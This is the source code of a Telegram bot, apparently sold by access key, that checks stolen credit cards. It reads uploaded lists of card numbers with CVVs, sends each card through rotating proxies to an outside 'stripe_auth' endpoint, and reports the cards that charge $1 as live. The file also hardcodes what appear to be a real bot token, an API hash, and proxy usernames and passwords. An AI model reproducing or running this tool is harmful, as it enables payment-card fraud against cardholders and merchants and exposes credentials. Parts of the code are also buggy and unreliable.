from telethon import TelegramClient, events
import re, asyncio, os, random, json
import aiohttp
import aiofiles
from datetime import datetime

API_ID = 37235723
API_HASH = "880a876edaf529c8493b873d47821ec2"
BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"

OWNER_ID = 7077294261

PREMIUM_FILE = "premium.json"
KEYS_FILE = "keys.json"

PROXIES = [
    "dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85",
    "px490402.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
]

client = TelegramClient('bot', API_ID, API_HASH)

async def load_json(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as f:
                await f.write(json.dumps({}))
            return {}
        async with aiofiles.open(filename, "r") as f:
            content = await f.read().strip()
            return json.loads(content) if content else {}
    except:
        return {}

async def save_json(filename, data):
    async with aiofiles.open(filename, "w") as f:
        await f.write(json.dumps(data, indent=4))

async def is_premium(user_id):
    if int(user_id) == OWNER_ID:
        return True
    data = await load_json(PREMIUM_FILE)
    uid = str(user_id)
    if uid not in data:
        return False
    try:
        expiry = datetime.fromisoformat(data[uid]['expiry'])
        return datetime.now() <= expiry
    except:
        return False

async def generate_key(days: int = 30):
    import secrets
    key = "STRIPE-" + secrets.token_hex(8).upper()
    data = await load_json(KEYS_FILE)
    data[key] = {"days": days, "used": False}
    await save_json(KEYS_FILE, data)
    return key

async def redeem_key(user_id, key: str):
    data = await load_json(KEYS_FILE)
    premium = await load_json(PREMIUM_FILE)
    uid = str(user_id)
    key = key.strip().upper()
    if key not in data or data[key].get("used"):
        return "❌ Invalid or already used key!"
    days = data[key]["days"]
    expiry = datetime.now() + datetime.timedelta(days=days)
    premium[uid] = {"expiry": expiry.isoformat(), "plan": f"{days} days"}
    data[key]["used"] = True
    await save_json(KEYS_FILE, data)
    await save_json(PREMIUM_FILE, premium)
    return f"✅ Success! Premium activated for {days} days."

# ================== CHECKER ==================
async def check_card(card: str):
    current_time = datetime.now().strftime('%H:%M:%S')
    print(f"[{current_time}] CHECKING → {card}")

    try:
        proxy = random.choice(PROXIES)
        proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"

        url = f"http://138.128.240.15:8009/stripe_auth?cc={card}"

        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy_url, timeout=40) as r:
                text = await r.text()
                print(f"[{current_time}] STATUS: {r.status} | RESPONSE: {text}")

                if r.status == 200 and any(x in text.lower() for x in ["approved", "success", "live", "charged"]):
                    print(f"[{current_time}] ✅ LIVE HIT!")
                    return {"status": "Approved", "response": "Charged $1"}
                else:
                    print(f"[{current_time}] ❌ DECLINED (Silent)")
                    return {"status": "Declined", "response": "Declined"}

    except Exception as e:
        print(f"[{current_time}] ERROR: {e}")
        return {"status": "Declined", "response": "Error"}

async def send_approved(event, card):
    msg = f"""
**Approved ✅**
━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 - `{card}`
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : Charged $1
[ϟ] 𝗚𝗮𝘁𝗲 - Stripe Auth
━━━━━━━━━━━━━
"""
    await event.reply(msg)

# ================== BOT ==================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
async def start(event):
    if not await is_premium(event.sender_id):
        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY`")
    await event.reply("**🔥 Stripe Checker**\nSend `.txt` file (Only Charged Cards)")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
async def genkey(event):
    if event.sender_id != OWNER_ID:
        return await event.reply("Owner only!")
    days = int(event.pattern_match.group(1) or 30)
    key = await generate_key(days)
    await event.reply(f"✅ New Key:\n`{key}`")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]key(?:\s+(.+))?$'))
async def redeem(event):
    key = event.pattern_match.group(1)
    if not key:
        return await event.reply("Usage: `/key YOURKEY`")
    msg = await redeem_key(event.sender_id, key)
    await event.reply(msg)

@client.on(events.NewMessage())
async def txt_handler(event):
    if not event.document or not str(event.file.name).lower().endswith('.txt'):
        return
    if not await is_premium(event.sender_id):
        return await event.reply("❌ No Access!")

    await event.reply("📂 Processing TXT file...")
    path = f"temp_{event.sender_id}.txt"
    await event.download_media(path)

    cards = []
    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = await f.read()
        found = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', content)
        for c in found:
            cleaned = re.sub(r'[^0-9|]', '', c.replace(' ', ''))
            if len(cleaned.split('|')) == 4:
                cards.append(cleaned)

    os.remove(path)

    if not cards:
        return await event.reply("❌ No valid cards!")

    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check... (Only Charged)")

    for card in cards:
        result = await check_card(card)
        if result["status"] == "Approved":
            await send_approved(event, card)
        # Dead cards silent
        await asyncio.sleep(5)

async def main():
    print("🚀 Bot Started - Only Charged Cards Shown")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
